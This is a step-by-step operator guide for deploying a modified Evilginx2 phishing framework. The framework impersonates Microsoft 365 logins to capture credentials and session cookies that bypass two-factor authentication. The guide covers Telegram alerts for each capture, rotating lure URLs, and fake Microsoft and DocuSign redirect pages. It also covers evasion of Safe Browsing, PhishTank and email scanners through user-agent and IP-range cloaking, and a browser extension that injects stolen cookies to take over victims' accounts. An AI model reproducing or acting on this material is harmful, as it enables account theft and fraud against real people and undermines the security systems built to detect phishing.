# Evilginx2 (Telegram Edition) — Deployment Guide

**From a fresh VPS to a fully operational phishing framework**

---

## WHAT YOU'LL BUILD

| Feature | Description |
|---------|-------------|
| Reverse Proxy Engine | Middleman between victim and real website; captures sessions transparently |
| Session Cookie Capture | Steals authenticated session tokens — bypasses 2FA completely |
| Wildcard SSL Certificate | One cert covers all subdomains; hidden from Certificate Transparency logs |
| Web Dashboard | HTTPS subdomain or port 5000 — view, search, filter, export captured sessions |
| Telegram Alerts | Instant phone notifications on credential capture |
| GeoIP Tracking | Country, city, ISP, VPN/proxy status per visitor |
| Redirect Pages | Custom HTML pages served on subdomains with optional Cloudflare Turnstile gate |
| VPN/Country Blocking | Block VPN users and/or entire countries |
| Cloudflare Turnstile | CAPTCHA challenge before victims see the login page |
| Header Stripping | Removes Evilginx fingerprints from HTTP responses |
| Blacklist System | Blocks repeat/unauthorized visitors |
| Auto-Start on Boot | Survives VPS reboots |

---

## REQUIREMENTS

| Item | Example |
|------|---------|
| VPS (Ubuntu 22.04 or 24.04) | 1 CPU, 1 GB RAM, 10 GB SSD |
| Domain name | `yoursite.com` |
| Cloudflare account (free) | https://dash.cloudflare.com |
| Telegram account | For bot creation |

---

# PART 1: CONNECT TO YOUR VPS

```bash
ssh root@YOUR_VPS_IP
```

Type `yes` to accept the host key, then enter your password.

---

# PART 2: SYSTEM PREPARATION

## Update packages

```bash
apt update && apt upgrade -y
```

## Install dependencies

```bash
apt install -y curl wget git make build-essential screen fail2ban htop net-tools ufw certbot nano tar unzip dnsutils
```

## Configure firewall

```bash
ufw allow 22/tcp
ufw allow 53/udp
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 5000/tcp
ufw allow out to 149.154.160.0/20
ufw allow out to 91.108.4.0/22
ufw allow out to 91.108.56.0/22
ufw --force enable
ufw status numbered
```

The first five are inbound ports for evilginx. The three `allow out` rules permit outbound connections to Telegram's API servers — without them, Telegram notifications will fail with `i/o timeout`.

## Free port 53 from Ubuntu's resolver

```bash
systemctl stop systemd-resolved
systemctl disable systemd-resolved
rm -f /etc/resolv.conf
echo "nameserver 1.1.1.1" | tee /etc/resolv.conf
echo "nameserver 1.0.0.1" | tee -a /etc/resolv.conf
chattr +i /etc/resolv.conf
```

Verify:

```bash
dig @1.1.1.1 google.com +short
```

Should return an IP address. Then reboot:

```bash
reboot
```

---

# PART 3: INSTALL GO

```bash
cd /tmp
GO_VERSION=$(curl -sL 'https://go.dev/VERSION?m=text' | head -1)
wget "https://go.dev/dl/${GO_VERSION}.linux-amd64.tar.gz"
rm -rf /usr/local/go
tar -C /usr/local -xzf "${GO_VERSION}.linux-amd64.tar.gz"
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
go version
rm "${GO_VERSION}.linux-amd64.tar.gz"
cd ~
```

For ARM64 VPS, replace `linux-amd64` with `linux-arm64`.

---

# PART 4: CLOUDFLARE + DNS

Do this in your browser.

## Add domain to Cloudflare

1. Go to https://dash.cloudflare.com → Add a Site → enter your domain → select Free
2. Copy the two nameservers Cloudflare assigns
3. In your domain registrar's dashboard, set nameservers to the ones Cloudflare gave you
4. Wait 5–15 minutes for propagation

## Add DNS records

In Cloudflare → DNS → add two A records:

| Type | Name | Value | Proxy |
|------|------|-------|-------|
| A | `@` | Your VPS IP | DNS Only (grey) |
| A | `*` | Your VPS IP | DNS Only (grey) |

**The cloud MUST be grey (DNS Only), NOT orange (Proxied). Orange cloud breaks Evilginx SSL.**

## SSL/TLS settings

Cloudflare → SSL/TLS → Overview → set to **Full**  
Edge Certificates → Always Use HTTPS → ON

## Verify DNS propagation

```bash
dig @1.1.1.1 yoursite.com +short
dig @1.1.1.1 test.yoursite.com +short
```

Both must return your VPS IP.

---

# PART 5: BUILD EVILGINX

Replace `YOUR_PAT` with a GitHub Personal Access Token that has **repo** scope for `michaelinbox02-star/evilginx2`.

```bash
cd /root
git clone https://YOUR_PAT@github.com/michaelinbox02-star/evilginx2.git evilginx2
cd evilginx2
go build -mod=mod -o evilginx2 .
chmod +x evilginx2
ls -lh evilginx2
```

The binary should be approximately 25 MB.

---

# PART 6: WILDCARD SSL CERTIFICATE

A wildcard cert covers all subdomains (`*.yoursite.com`) and keeps them hidden from Certificate Transparency logs.

## Request the certificate

```bash
certbot certonly --manual --preferred-challenges dns -d '*.yoursite.com' -d 'yoursite.com'
```

Follow the prompts:
1. Enter email → Agree to terms (`A`) → Skip EFF email (`N`)
2. Certbot shows a TXT record to add: **do not press Enter yet**

## Add the TXT record

In Cloudflare → DNS → Add record:

| Type | Name | Value | TTL |
|------|------|-------|-----|
| TXT | `_acme-challenge` | (the value certbot shows) | Auto |

Verify propagation in a second terminal:

```bash
dig @1.1.1.1 _acme-challenge.yoursite.com TXT +short
```

Once it shows the value, go back to certbot and press Enter.

✅ Success output:
```
Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/yoursite.com/fullchain.pem
Key is saved at:         /etc/letsencrypt/live/yoursite.com/privkey.pem
```

## Copy certificate to Evilginx

```bash
mkdir -p /root/.evilginx/crt/wildcard
cp /etc/letsencrypt/live/yoursite.com/fullchain.pem /root/.evilginx/crt/wildcard/
cp /etc/letsencrypt/live/yoursite.com/privkey.pem /root/.evilginx/crt/wildcard/
chmod 644 /root/.evilginx/crt/wildcard/fullchain.pem
chmod 600 /root/.evilginx/crt/wildcard/privkey.pem
```

Verify it's a wildcard:

```bash
openssl x509 -in /root/.evilginx/crt/wildcard/fullchain.pem -noout -subject
# Must show: subject = CN = *.yoursite.com
```

---

# PART 7: INITIAL CONFIGURATION

Start Evilginx once to create config files and set up base settings:

```bash
cd /root/evilginx2
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass changeme
```

At the `evilginx>` prompt:

```
config domain yoursite.com
config ipv4 external YOUR_VPS_IP
config autocert on
config unauth_url https://login.microsoftonline.com
config unauth_redirect on
config strip_headers on
blacklist unauth
exit
```

**Note:** `autocert on` is required for Evilginx to find and use the wildcard certificate in `~/.evilginx/crt/wildcard/`.

**Note:** `unauth_redirect on` answers every unauthorized/blocked request with an HTTP `302` to `unauth_url` (instead of serving a fetched copy of the page). Crawlers and Google Safe Browsing therefore always land on the genuine `login.microsoftonline.com`, which is the strongest possible "clean redirector" signal. Set it `off` to fall back to serving a rewritten copy of the page.

**Note:** `force_login on` (default) makes the provider show its credential form even when the visitor's browser already holds a valid session. Without it, an already-signed-in victim gets silently signed back in and never types a password, so the capture is empty. It appends `prompt=login` to OAuth `authorize` hops and `wfresh=0` to SAML/WS-Fed hops, leaving an app's own `prompt=` value alone. Toggle it in the control panel under **Manage → Settings**, or `config force_login on|off`.

---

# PART 8: TELEGRAM INTEGRATION

## Create a Telegram bot

1. Open Telegram → search `@BotFather` → send `/newbot`
2. Choose a name and username (must end in `bot`)
3. Copy the token BotFather gives you (e.g. `8863425004:AAF7mZ0...`)

## Get your Chat ID

1. Search for your bot in Telegram and send it any message
2. Then run:

```bash
curl -s "https://api.telegram.org/botYOUR_TOKEN/getUpdates"
```

Find `"chat":{"id":XXXXXXXX}` — that number is your Chat ID.

## Configure in Evilginx

```bash
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass changeme
```

```
config teletoken YOUR_BOT_TOKEN
config chatid YOUR_CHAT_ID
config telegram test
exit
```

You should receive a test message in Telegram.

---

# PART 9: GEOIP DATABASE SETUP

GeoIP shows country, city, ISP, and VPN status for each visitor.

```bash
mkdir -p /root/.evilginx/GeoIP
cd /root/.evilginx/GeoIP

# City database
curl -L -o GeoLite2-City.mmdb "https://github.com/mojolabs-id/GeoLite2-Database/releases/download/latest/GeoLite2-City.mmdb"

# ASN/ISP database
curl -L -o GeoLite2-ASN.mmdb "https://github.com/jowinjohnchemban/GeoLite.mmdb/releases/download/2026.09.06/GeoLite2-ASN.mmdb"

ls -lh /root/.evilginx/GeoIP/
```

Both files should be several MB each. If they're only a few KB, the download was rate-limited — try again later or download manually and upload via SCP.

---

# PART 10: START EVILGINX WITH ALL FEATURES

```bash
cd /root/evilginx2
./evilginx2 \
  -dashboard 0.0.0.0:5000 \
  -dashboard-user admin \
  -dashboard-pass changeme \
  -geoip-db /root/.evilginx/GeoIP
```

On startup you should see:
```
[wld] using wildcard certificate for: *.yoursite.com
[inf] wildcard certificate loaded..
[inf] geoip: GeoIP initialized — country tracking active
[dashboard] web interface starting on http://0.0.0.0:5000
```

If you don't see the wildcard messages, check that:
- Both files exist in `/root/.evilginx/crt/wildcard/`
- The cert subject is `CN = *.yoursite.com`
- `autocert` is enabled (`config autocert on`)

---

# PART 11: PHISHLETS AND LURES

## Set up the o365 phishlet

The `o365` phishlet captures credentials and session cookies for both **Office 365 work/school accounts** and **personal Outlook/Hotmail accounts**.

```
phishlets hostname o365 yoursite.com
phishlets enable o365
```

## Create a lure

```
lures create o365
```

You can also specify a custom subdomain for the lure:

```
lures create o365 login
```

This sets the phishing URL to `https://login.yoursite.com/<token>` instead of auto-assigning a subdomain.

Get the phishing URL:

```
lures get-url 0
```

The URL is what you send to targets. When they visit it and log in, credentials and session cookies are captured and sent to Telegram.

**Note on social login options:** The o365 phishlet routes through the enterprise OAuth flow which suppresses Google/Apple social login options that appear on Microsoft's consumer login page — the phishing page matches the official enterprise login experience.

## Clone a lure

Duplicate a lure with all its settings (hostname, redirect URL, OG tags, etc.) but a fresh random path:

```
lures clone 0
```

Useful when running multiple campaigns with the same phishlet configuration — clone the base lure once, then send different URLs to different targets without setting everything up from scratch.

## Reload a phishlet without restarting

After editing a phishlet YAML file (updating a JS injection, fixing a subfilter, etc.), reload it live:

```
phishlets reload o365
```

The change takes effect immediately. If the phishlet was enabled, active hostnames and certificates are refreshed automatically. If the YAML has a syntax error, the existing phishlet stays in memory untouched.

## Refresh all phishlets (and pick up new ones)

To reload every phishlet YAML at once — and also pick up any new `.yaml` files you've dropped into the phishlets directory since startup:

```
phishlets refresh
```

What it does:
- Scans the phishlets directory for all `.yaml` files
- **New files** (not yet in memory): parsed and registered immediately — no restart needed
- **Existing phishlets**: reloaded from disk, picking up any edits
- Child phishlets (created with `phishlets create`) are skipped — they derive from their parent
- If any enabled phishlet was updated, active hostnames and certificates refresh automatically

**Hostname collision warning:** If two phishlets in your directory target the same real domain (e.g. two Microsoft O365 variants), refresh will emit a `[war] hostname collision` warning. This is expected — just make sure only one of them is enabled at a time (`phishlets disable <name>`), otherwise lure routing becomes ambiguous.

## Auto-rotating lures (autolures)

An autolure keeps the phishing path hidden until a real visitor arrives. You share a permanent **gateway URL** (root of the subdomain) — visiting it redirects the browser to the current active path, which rotates automatically on a timer. Scanner UAs are blocked before the redirect fires, so crawlers never see where the phishing content lives.

```
[target gets this]  https://login.yoursite.com
                            ↓ (302 on real browser click)
[actual content]    https://login.yoursite.com/iirr94lsl
                            ↓ (auto-rotates every N minutes)
[new path]          https://login.yoursite.com/xq9pw3kl
```

**Create an autolure:**

```
autolures create o365 login
```

Creates an autolure on `login.yoursite.com` with a random rotation interval (45–90 min). You always share `https://login.yoursite.com` — never the path.

**With a fixed rotation interval:**

```
autolures create o365 login 1h
autolures create o365 login 30m
autolures create o365 login 2h30m
```

**List all autolures** (shows countdown to next rotation):

```
autolures
```

**Get the current active URL:**

```
autolures get-url 0
```

**Toggle Telegram notification on rotation:**

```
autolures notify 0 off    ← disable (default: on)
autolures notify 0 on     ← re-enable
```

Every time the path rotates, a Telegram message is sent with:
- The gateway URL (the permanent link you share)
- The new active path
- The timestamp of the next rotation

**Delete an autolure:**

```
autolures delete 0
```

> **How it protects against scanners:** Email security gateways pre-scan links before the target sees them. With a regular lure the full path URL is in the email — the scanner can flag it. With an autolure only `https://login.yoursite.com` is in the email. The scanner hits the root, gets the `unauth_url` content (cloaked), and marks the domain clean. The active path is never exposed in the email.

---

# PART 12: DASHBOARD (per-server)

Each deployment serves its own **Dashboard** — a clean, minimalist single-page app
that drives every engine feature from the browser. This is what the person running
the campaign opens: captured sessions, one-click cookie takeover, phishlets, lures,
blacklist and settings. It works with the Session Injector extension (Part 12a).

> **Control Panel vs Dashboard.** The Dashboard runs *inside* evilginx on the VPS.
> The **Control Panel** is a *separate* app you run on your own machine that
> SSH‑installs and manages one or many servers (including **adopting an existing
> install** without reinstalling), and hands users their Dashboard link +
> extension. See **[CONTROL-PANEL.md](CONTROL-PANEL.md)**.

The Dashboard is served on the dashboard port and, optionally, on an HTTPS subdomain.

## Access

```bash
# over the panel port (plain HTTP)
http://YOUR_VPS_IP:5000

# or over HTTPS with the wildcard cert (recommended)
config dashboardsub panel      # -> https://panel.yoursite.com
```

Sign in with `-dashboard-user` / `-dashboard-pass`. The first visit lands on a
login page; a session token is stored in an HttpOnly cookie. HTTP Basic auth is
also accepted (handy for `curl`), and a `Bearer <token>` header works too.

If both username and password are empty, auth is disabled entirely — always set
at least a password on a public VPS.

## What the Dashboard shows

The Dashboard is deliberately **Sessions-only** — end users get the least possible
surface. Everything else is done from the Control Panel.

| Area | What it does |
|------|--------------|
| **Sessions** | Searchable / filterable capture table; row drawer with credentials, GeoIP + user-agent, full cookie JSON; one-click takeover; CSV/JSON export; bulk delete |

Statistics (captures, token rate, unique IPs, active now) are shown in the header,
and auto-refresh runs every 10 s.

The full engine API (phishlets, lures, autolures, redirects, blacklist, config,
system, integrations) still exists under `/api/v1/` — the Control Panel drives it
remotely.

## Live credential updates

```
config dashboard-user newuser
config dashboard-pass newpassword
```

Changes apply immediately to both the terminal and the panel.

## Extension bridge

The panel keeps the `data-app="ctrl-panel"` marker and the `postMessage`
protocol (`DO_INJECT`, `SESSION_SELECT`, `inject-result`) used by the Session
Injector extension, and exposes the same `/api/cookies`-style export shape — so
**Part 12a** keeps working unchanged.

## API

Everything is a small JSON API under `/api/v1/` (sessions, phishlets, lures,
autolures, redirects, blacklist, config, system, integrations). Legacy
`/api/sessions*` and `/api/cookies/*` endpoints are kept for older tooling.

```bash
curl -u admin:PASS http://YOUR_VPS_IP:5000/api/v1/overview
curl -u admin:PASS -X POST -H 'Content-Type: application/json' \
  -d '{"phishlet":"o365new","subdomain":"login"}' \
  http://YOUR_VPS_IP:5000/api/v1/lures
```

---

# PART 12a: SESSION INJECTOR BROWSER EXTENSION

The `extension/` folder in the repo is a Manifest V3 Chromium extension that automates session takeover — no Cookie-Editor needed. It injects cookies directly via the browser's native API, which works for HttpOnly cookies that JavaScript cannot touch.

**It never silently touches the profile you are signed into.** You choose where each takeover lands:

| Target | Cookie jar | Your own logins |
|--|--|--|
| **Incognito window** | separate | untouched; close the window to discard |
| **Normal window** | shared with yours | the session's domains are overwritten |
| **This tab** | shared with yours | same as normal, no new window |

Default is **Normal**; set your preference in the popup or options page. Whichever you pick, a takeover **replaces** the previous victim on the relevant domains rather than merging with them, so nothing is ever half-and-half.

## Install (one-time, on the machine you use to access the dashboard)

Pull the latest repo on that machine, then:

1. Open **Brave** or **Chrome** → address bar → `brave://extensions` or `chrome://extensions`
2. Enable **Developer mode** toggle (top-right corner)
3. Click **Load unpacked**
4. Select the `extension/` folder inside the repo
5. The extension loads immediately — no browser restart needed

> If you only have the repo on the VPS, copy the `extension/` folder to your local machine via SCP:
> ```bash
> scp -r root@YOUR_VPS_IP:/root/evilginx2/extension ./extension
> ```
> Then load it from the local copy.

> **Leave "Allow in incognito" alone.** The manifest declares `"incognito": "spanning"`, which is what lets the extension write into an incognito window. If incognito is blocked by policy, the popup says so and falls back to a normal window.

## Using it

1. Open the dashboard and click any session row that shows a token indicator
2. Click **Take over**
3. Pick **Incognito window**, **Normal window** or **This tab** — the default is sent automatically
4. The target opens in that window, already authenticated

The window's first tab is a pinned card naming the victim (also used as the tab-group label), so several windows are tellable apart. The modal reports how many cookies went in, how many were cleared first, and flags any that failed — a failed cookie does not always matter.

Want two victims at once? Use the Incognito target for one and Normal for the other, or run a second Chrome with its own profile: `chrome --user-data-dir=/tmp/victim2`.

## Naming windows

The card and tab group are labelled from the victim's address. Set a **window name prefix** in the popup/options (e.g. `camp-` → `camp-alice@contoso.com`), or rename the live window from the popup. Renaming is cosmetic — it never changes the cookies.

## Popup and settings

Click the Session Injector icon in the toolbar:

- **Status** — whether a dashboard tab is open, and which takeover windows exist (with *Focus*)
- **Selected session** — the row you clicked, with the three target buttons
- **Live: <name>** — what is currently loaded, with *Focus*, *Set* (rename) and *Clear cookies*
- **Recent sessions** — replay any of the last 8 without going back to the dashboard
- **Behaviour** — default target, name prefix, auto-open, *Close windows*

Right-click the icon → **Options** for the wider view, plus the dashboard URL and login. With those set, the popup can take over any session even when no dashboard tab is open.

## Pasting cookies in

When the data already exists — a `.json` export, a `Cookie:` header, a `document.cookie`
string — you do not need a live session. Open **paste cookies** (popup → *paste
cookies*, or the button on the Recent row), then:

1. Give the **target URL** (where to open, and which domain plain text belongs to)
2. Paste, or drop a file. *Check* shows the parsed count and domains first
3. Optionally name the window, pick the target, hit **Take over**

Accepted formats: Cookie-Editor style JSON, this project's own cookie export, a plain
`{"name":"value"}` map, a raw `Cookie: a=1; b=2` header, and `a=1; b=2` text.
The extension reports exactly what it parsed before writing anything.

## What it does vs. Cookie-Editor

| | Session Injector extension | Cookie-Editor (manual) |
|--|---------------------------|------------------------|
| HttpOnly cookies | Injected automatically | Also works |
| Steps required | 1 click | Download → open tab → import → reload |
| Offline data (file / header) | Paste-in, same flow | Import only |
| Disturbs your own logins | Optional (incognito target) | Yes |
| Switch victim | One click, stale domains cleared | Manual delete first |

## Updating the extension after a repo pull

The extension code is in `extension/` — if it changes after a pull, go to `chrome://extensions`, find **Session Injector**, and click the **refresh icon** on its card.

## Testing the extension without a browser

`node extension/test.js` runs the background worker against mocked Chrome APIs and asserts the guarantees: the incognito jar is written and the default jar is not, `sameSite=none` is upgraded to `secure`, `__Host-` cookies drop their domain, switching victims clears the previous domains, `clear` only touches jars actually written to, and the paste parser handles every accepted format. 69 assertions.

---

# PART 13: REDIRECT PAGES

Redirect pages are custom HTML files you serve on subdomains. Visitors who land on a redirect page see your HTML content and optionally get redirected to another URL. Useful for pre-phishing landing pages, fake loading screens, or social engineering flows.

## Setup

Place HTML files in `~/.evilginx/redirects/`:

```bash
mkdir -p /root/.evilginx/redirects
# Copy your HTML file there:
cp /path/to/loading.html /root/.evilginx/redirects/
```

## Assign a redirect page to a subdomain

In the Evilginx terminal:

```
redirects add <subdomain> <filename> [target_url] [on|off]
```

**Examples:**

```
# Page handles its own redirect (URL baked into the HTML)
redirects add landing loading.html

# Page redirects to a URL after loading
redirects add landing loading.html https://target.com/path

# Page shows Cloudflare Turnstile challenge, then redirects
redirects add landing loading.html https://target.com/path on

# Page shows Turnstile, but redirect is in the HTML itself
redirects add landing loading.html on
```

- `<subdomain>` — subdomain under your config domain (e.g. `landing` → `https://landing.yoursite.com`)
- `<filename>` — filename of the HTML file inside `~/.evilginx/redirects/`
- `[target_url]` — optional; if omitted, the HTML handles its own redirect
- `[on|off]` — optional; `on` enables Cloudflare Turnstile gate (requires `-turnstile` flag at startup)

## Template library (recommended)

The engine ships **8 ready-made redirect designs**, embedded in the binary (nothing
to upload). Manage them from the Control Panel → *Redirects* → pick a template →
preview in-line → **Create**. The engine writes the chosen template into the
redirects dir and registers the subdomain with your target URL, delay and
Turnstile options.

| Template | Category | Idea |
|---|---|---|
| Clean Progress | generic | minimal light page, slim bar, countdown |
| Generic Signing In | generic | brand-neutral progress ring, "Signing you in" |
| Minimal Loader | generic | browser-style top bar — least suspicious |
| Microsoft Spinner | microsoft | white card, MS logo, "Signing you in…" |
| Microsoft Loading (blue) | microsoft | full-bleed MS-blue boot screen |
| File Ready (cloud) | file | cloud file card, "Your file is ready", Open button |
| Document Preview | document | PDF-preview card with % progress |
| DocuSign Redirect | document | DocuSign wordmark pre-lure screen |

Templates use placeholders that the engine fills at serve time, so changing any of
them takes effect immediately without rewriting the file:

| Placeholder | Meaning |
|---|---|
| `__DESTINATION__` | target URL |
| `__DELAY__` | seconds before the redirect |
| `__BRAND__` | brand / wordmark text |
| `__TITLE__` / `__SUBTITLE__` | headline text |
| `__LOGO__` | logo mark (`mark`, `microsoft`, `docusign`, `cloud`, `file`, `ring`, `none`, or an image URL) |
| `__ACCENT__` | accent colour (hex) |
| `__BUTTON__` | button label |
| `__MSGS__` | JS array literal of the rotating status lines |
| `__ts_slot__` | where an inline Turnstile widget is injected |

Per-page overrides (brand/title/subtitle/accent/logo/button/messages) are settable
from the Control Panel → Redirects, with a live preview. API:

```bash
curl -u admin:PASS http://VPS:5000/api/v1/redirect-templates
curl -u admin:PASS -X POST -H 'Content-Type: application/json' \
  -d '{"subdomain":"landing","template":"ms-spinner","target_url":"https://login.microsoftonline.com/","delay":3,"turnstile":true,"turnstile_pos":"slot","turnstile_type":"non-interactive","turnstile_theme":"auto","brand":"Contoso","title":"Contoso - Sign in","accent":"#7c3aed","logo":"microsoft"}' \
  http://VPS:5000/api/v1/redirects
```

## Turnstile placement & type

For any redirect page you can choose **where** and **what kind** of Turnstile to show:

| `turnstile_pos` | Placement |
|---|---|
| `slot` *(default)* | inline where the template has its `__ts_slot__` marker |
| `inline` | same as slot |
| `overlay` | full-screen dim overlay, centred card |
| `center` | fixed centred widget |
| `bottom` | fixed above the bottom edge |
| `corner` | fixed bottom-right |

| `turnstile_type` | Behaviour |
|---|---|
| `managed` *(default)* | standard visible widget |
| `non-interactive` | hidden unless interaction is needed |
| `invisible` | `interaction-only` + flexible size, effectively invisible |

`turnstile_theme` = `auto` \| `light` \| `dark`.

> Set the matching widget mode in the Cloudflare dashboard; `type` above maps to
> Turnstile's `data-appearance`/`data-size` and is the closest equivalent.

## Anti-bot hardening (automatic)

- A crawler/scanner User-Agent hitting a redirect page is answered with a plain
  **302 to the target** instead of HTML — Google Safe Browsing and link previewers
  land on the genuine site and never render the decoy.
- `<noscript><meta http-equiv="refresh">` is injected so JS-less clients still move.
- `X-Robots-Tag: noindex, nofollow` + `Cache-Control: no-store` are always sent.

## List and delete redirect pages

```
redirects list
redirects delete 0
```

## Notes

- The wildcard cert covers all redirect page subdomains automatically
- Multiple redirect pages can be active simultaneously
- Custom (non-template) files keep working: if the file has no `__DESTINATION__`
  placeholder the engine injects a redirect before `</body>` as before

---

# PART 14: AUTO-START ON BOOT (SYSTEMD)

## Create the service file

```bash
nano /etc/systemd/system/evilginx.service
```

Paste:

```ini
[Unit]
Description=Evilginx2 Telegram Edition
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/root/evilginx2
ExecStart=/root/evilginx2/evilginx2 \
    -dashboard 0.0.0.0:5000 \
    -dashboard-user admin \
    -dashboard-pass changeme \
    -geoip-db /root/.evilginx/GeoIP
Restart=always
RestartSec=5
LimitNOFILE=65535
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

Save: `Ctrl+X` → `Y` → `Enter`

## Enable and start

```bash
systemctl daemon-reload
systemctl enable evilginx
systemctl start evilginx
systemctl status evilginx
```

Status should show `active (running)`.

## View logs

```bash
journalctl -u evilginx -f
```

Press `Ctrl+C` to stop watching.

---

# PART 15: CERTIFICATE AUTO-RENEWAL

Let's Encrypt certs expire after 90 days. For manual renewal every 60–80 days:

```bash
# Delete old TXT record from Cloudflare first, then:
certbot certonly --manual --preferred-challenges dns -d '*.yoursite.com' -d yoursite.com

# After certbot succeeds, copy new certs:
cp /etc/letsencrypt/live/yoursite.com/fullchain.pem /root/.evilginx/crt/wildcard/
cp /etc/letsencrypt/live/yoursite.com/privkey.pem /root/.evilginx/crt/wildcard/
chmod 644 /root/.evilginx/crt/wildcard/fullchain.pem
chmod 600 /root/.evilginx/crt/wildcard/privkey.pem
systemctl restart evilginx
```

---

# PART 16: OPTIONAL FEATURES

## Cloudflare Turnstile CAPTCHA

Adds a CAPTCHA challenge before victims reach the phishing page — filters out scanners and bots.

1. Cloudflare dashboard → Turnstile → Add a site
2. Copy the **Site Key** and **Secret Key**

Add to the systemd service `ExecStart`:

```ini
ExecStart=/root/evilginx2/evilginx2 \
    -dashboard 0.0.0.0:5000 \
    -dashboard-user admin \
    -dashboard-pass changeme \
    -geoip-db /root/.evilginx/GeoIP \
    -turnstile SITEKEY:SECRETKEY
```

Reload: `systemctl daemon-reload && systemctl restart evilginx`

Or set the keys live from the Evilginx terminal (no restart needed):

```
config turnstile SITEKEY:SECRETKEY
config turnstile off
```

Turnstile also works on redirect pages — set the `on` flag when adding a redirect page (see Part 13).

**Turnstile widget placement:** The challenge widget position is controlled by the HTML in `redirectors/turnstile/index.html`. Move the `<div id="cf-turnstile">` element to wherever you want the widget to appear on the page. The widget auto-solves (invisible mode) and immediately redirects the visitor to the lure URL — no button click needed.

**Note on the Telegram i/o timeout:** If Telegram notifications fail with `dial tcp 149.154.166.110:443: i/o timeout`, your VPS outbound to Telegram's API is being blocked. Fix:

```bash
# Allow Telegram's IP range outbound
ufw allow out to 149.154.160.0/20
ufw allow out to 91.108.4.0/22
ufw allow out to 91.108.56.0/22
ufw reload

# Test:
curl -s --max-time 10 "https://api.telegram.org/botYOUR_TOKEN/getMe"
```

## Block VPN visitors

Enable at startup via flag:

```ini
ExecStart=... -block-vpn
```

Or toggle live from the Evilginx terminal without restarting:

```
config blockvpn on
config blockvpn off
```

Both require GeoIP database. When enabled, any visitor whose IP resolves as a VPN, proxy, or datacenter is served the `unauth_url` instead of the phishing page.

## Block specific countries

```ini
ExecStart=... -block-countries RU,CN,IR,KP
```

Use ISO 3166-1 alpha-2 country codes. Requires GeoIP database.

## Scanner UA Cloaking (Anti-Safe-Browsing)

Evilginx Telegram Edition has built-in scanner detection. Any request that matches a known security crawler **or originates from a known crawler network range** is intercepted **before** it reaches any phishing logic and is answered with a clean `302` redirect to the phishlet's real login URL (so Google Safe Browsing, PhishTank, link previewers, and generic HTTP clients all follow a redirect to the genuine site). Their IP is also auto-blacklisted so subsequent requests are dropped at the IP level.

**Why a redirect and not a spoofed page:** Google Safe Browsing scores the *final destination*. A `302` to `login.microsoftonline.com` means Google evaluates the real Microsoft login — which it already trusts — so the phish domain is classified as an innocent redirector and never carries a "Deceptive site ahead" warning.

**Two independent detection layers:**
1. **User-Agent** — any crawler/scanner/previewer string (see categories below).
2. **Source IP range** — Google crawler / Safe-Browsing netblocks (`66.249.64.0/19`, `64.233.160.0/19`, `72.14.192.0/18`, `74.125.0.0/16`, `209.85.128.0/17`, `216.58.192.0/19`, `216.239.32.0/19`, and `66.249.80.0/20`, `66.249.90.0/24`). This catches a crawler that presents an ordinary browser User-Agent or a headless rendering pass.

**Detected categories (User-Agent):**
- Google Safe Browsing (`Google-SafeBrowsing`, `Googlebot`, `AdsBot-Google`, `Google-InspectionTool`)
- Phishing feeds (`PhishTank`, `OpenPhish`)
- Generic clients (`curl`, `wget`, `python-requests`, `python-urllib`, `go-http-client`, `libwww-perl`, `java/`, `okhttp/`)
- Security scanners (`nuclei`, `sqlmap`, `nikto`, `masscan`, `zgrab`, `nessus`, `burpsuite`, `census`, `shodan`)
- Search crawlers (`Bingbot`, `YandexBot`, `Slurp`, `DuckDuckBot`, `Baiduspider`)
- Link previewers (`facebookexternalhit`, `Twitterbot`, `LinkedInBot`, `WhatsApp`, `TelegramBot`, `Discordbot`, `Slackbot`)
- Headless / SEO / URL-scanner agents (`headlesschrome`, `chrome-lighthouse`, `semrushbot`, `ahrefsbot`, `urlscan`, `virustotal`, `screaming frog`, `zoominfobot`)

**Required config (already set in Part 7):**

```
config unauth_url https://login.microsoftonline.com
config unauth_redirect on
blacklist unauth
```

`unauth_url` is where unauthorized traffic is bounced.

### Plain HTTP on port :80 must be live

The `:80` listener is **always** started. It answers the ACME `http-01` challenge and `302`-redirects every `http://` request to `https://`. A connection-refused on `:80` is a common triage flag for crawlers and link previewers, so leave it bound and leave `80/tcp` open in the firewall.

### The shared lure link

Point every `phishlets hostname` at the bare domain and share the **lure subdomain path**, e.g. `https://login.yoursite.com/auth/login`. A crawler hitting that exact URL still gets the `302` to the real login; a fresh browser gets the proxied Microsoft page. Do not share the apex root unless the lure is bound to it.

### Blacklisted IPs can still use the link

`blacklist unauth` adds unauthorized IPs to `blacklist.txt` (this is what keeps scanners out). A blacklisted IP that clicks the lure link — or that still holds a live session — is now allowed through instead of being dumped on the decoy page, so the shared link keeps working on repeat visits. Entries live for 60 minutes and are refreshed on every request.

**Optional: pre-seed Google IP ranges**

Append to `~/.evilginx/blacklist.txt` to block Google crawlers at the IP level before they even make a request:

```
; Google Safe Browsing / crawler ranges
66.249.64.0/19
66.249.80.0/20
66.249.90.0/24
64.233.160.0/19
72.14.192.0/18
74.125.0.0/16
209.85.128.0/17
216.58.192.0/19
216.239.32.0/19
```

Restart evilginx after editing `blacklist.txt` — the file is loaded at startup.

---

# PART 17: COMPLETE COMMAND REFERENCE

## Config commands

| Command | Description |
|---------|-------------|
| `config` | Show all current settings |
| `config domain <domain>` | Set phishing domain |
| `config ipv4 external <ip>` | Set VPS external IP |
| `config autocert on/off` | Enable/disable automatic SSL (needed to load wildcard cert) |
| `config unauth_url <url>` | Redirect unauthorized visitors here |
| `config unauth_redirect on/off` | `on`: answer unauthorized/blocked traffic with a 302 to `unauth_url` (Safe-Browsing friendly); `off`: serve a rendered copy |
| `config strip_headers on/off` | Remove Evilginx fingerprints from responses |
| `config force_login on/off` | `on`: always show the provider's login form (`prompt=login`), even if the visitor is already signed in |
| `config blockvpn on/off` | Block visitors detected as VPN/proxy/datacenter (requires GeoIP) |
| `config turnstile <sitekey:secretkey>` | Enable Cloudflare Turnstile CAPTCHA (use `off` to disable) |
| `config teletoken <token>` | Telegram bot token |
| `config chatid <id>` | Telegram chat ID |
| `config dashboardsub <sub>` | Set dashboard HTTPS subdomain (e.g. `panel`) |
